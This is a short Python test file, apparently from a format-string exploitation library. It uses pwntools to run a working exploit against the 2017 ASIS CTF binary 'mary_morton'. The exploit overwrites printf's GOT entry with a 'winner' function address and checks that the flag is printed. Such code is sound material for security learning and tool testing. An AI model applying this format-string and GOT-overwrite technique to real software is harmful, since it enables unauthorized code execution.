#!/usr/bin/env python

import os

SCRIPTDIR = os.path.dirname(os.path.realpath(__file__))

import sys
#sys.path.insert(0, os.path.join(SCRIPTDIR,"..",".."))

from formatStringExploiter.FormatString import FormatString
from pwn import process, ELF
import logging

from time import sleep

def exec_fmt(s):
    print("Sending: " + repr(s))
    p.sendline("2")
    sleep(0.5)
    p.sendline(s)
    ret = p.recvuntil("1. Stack Bufferoverflow Bug",drop=True)
    p.recvuntil("Exit the battle \n")
    return ret

def connect():
    global p
    p = process(elf.file.name, cwd=SCRIPTDIR)
    p.recvuntil("Exit the battle \n")

logging.basicConfig(level=logging.DEBUG)
log = logging.getLogger()

elf = ELF(os.path.join(SCRIPTDIR,"2017_asis_mary_morton"))
connect()


def test_win():
    winner = 0x4008DA

    connect()

    fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)

    fmtStr.write_q(elf.symbols['got.printf'], winner)

    p.sendline("2")
    p.sendline("")
    out = p.recvline()
    assert b"This_is_the_flag" in out

